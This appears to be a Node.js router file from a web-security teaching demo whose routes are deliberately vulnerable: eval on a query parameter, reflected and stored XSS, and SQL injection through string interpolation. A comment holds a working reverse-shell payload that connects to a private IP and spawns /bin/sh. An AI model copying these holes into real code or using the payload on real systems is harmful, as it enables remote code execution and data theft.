const Router = require('./../server/plugin/router.js');
const DB = require('./../utils/db.js');
const router = new Router();

// 首页 路由
router.get('/', (ctx, next)=>{
    ctx.render('index.ejs', { title: 'WEB安全技术分享' });
})


// os可执行命令注入 路由
router.get('/shell', (ctx, next)=>{

    if(ctx.params['404']){
        eval(ctx.params['404']);
    } 
    ctx.body = 'shell';

    // payload
    // (function(){var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect(7777,"10.211.55.3",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client)});return/a/})();
})


// xss漏洞 非存储型 路由
router.get('/xss', (ctx, next)=>{
    ctx.render('xss.ejs', {xss: ctx.params['xss'] || 'xss漏洞'});
})


// xss漏洞 存储型 路由
router.get('/dxss', async (ctx, next)=>{
    const _sql = `insert ignore into article (content) values ('${ctx.params['content']}')`
    try {
        if(ctx.params['content']){
            await DB.query(_sql);
        }
        const result = await DB.query('select content from article');
        ctx.render('dxss.ejs', {ly: result});
    }catch(e){
        ctx.render('dxss.ejs', {ly: []});
    }
})


// 跨站 csrf 漏洞 路由
router.get('/csrf', (ctx, next)=>{
    ctx.render('csrf.ejs', {});
})


// sql注入漏洞 路由
router.get('/sql', async function(ctx, next){
    let _sql = `select * from score`;
    if (ctx.params['id']){
       _sql = `select * from score where id = ${ctx.params['id']}`;
    }
    try {
        const result = await DB.query(_sql);
        ctx.render('sql.ejs', {score: result});
    }catch(e){
        ctx.body = e.toString();
    }
})


// sql注入漏洞 路由
router.get('/msql', async function(ctx, next){
    let _sql = `select * from score`;
    if (ctx.params['id']){
       _sql = `select * from score where id = ${ctx.params['id']}`;
    }
    try {
        const result = await DB.query(_sql);
        ctx.render('sql.ejs', {score: result});
    }catch(e){
        ctx.render('sql.ejs', {score: []});
    } 
})

module.exports = router;